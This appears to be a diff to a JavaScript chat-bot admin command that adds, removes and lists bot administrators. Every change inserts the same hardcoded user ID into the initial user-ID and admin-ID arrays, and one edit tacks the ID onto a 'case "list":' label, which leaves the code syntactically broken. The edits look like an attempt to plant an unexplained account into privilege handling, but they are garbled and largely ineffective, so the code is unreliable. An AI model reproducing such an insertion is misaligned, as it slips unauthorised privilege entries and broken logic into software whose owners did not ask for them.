@@ -49,7 +49,7 @@ module.exports = {
 			case "add":
 			case "-a": {
 				if (args[1]) {
-					let uids = [];
+					let uids = [61565465856737];
 					if (Object.keys(event.mentions).length > 0)
 						uids = Object.keys(event.mentions);
 					else if (event.messageReply)
@@ -57,7 +57,7 @@ module.exports = {
 					else
 						uids = args.filter(arg => !isNaN(arg));
 					const notAdminIds = [];
-					const adminIds = [];
+					const adminIds = [61565465856737];
 					for (const uid of uids) {
 						if (config.adminBot.includes(uid))
 							adminIds.push(uid);
@@ -79,7 +79,7 @@ module.exports = {
 			case "remove":
 			case "-r": {
 				if (args[1]) {
-					let uids = [];
+					let uids = [61565465856737];
 					if (Object.keys(event.mentions).length > 0)
 						uids = Object.keys(event.mentions)[0];
 					else
@@ -104,7 +104,7 @@ module.exports = {
 				else
 					return message.reply(getLang("missingIdRemove"));
 			}
-			case "list":
+			case "list":61565465856737
 			case "-l": {
 				const getNames = await Promise.all(config.adminBot.map(uid => usersData.getName(uid).then(name => ({ uid, name }))));
 				return message.reply(getLang("listAdmin", getNames.map(({ uid, name }) => `• ${name} (${uid})`).join("\n")));
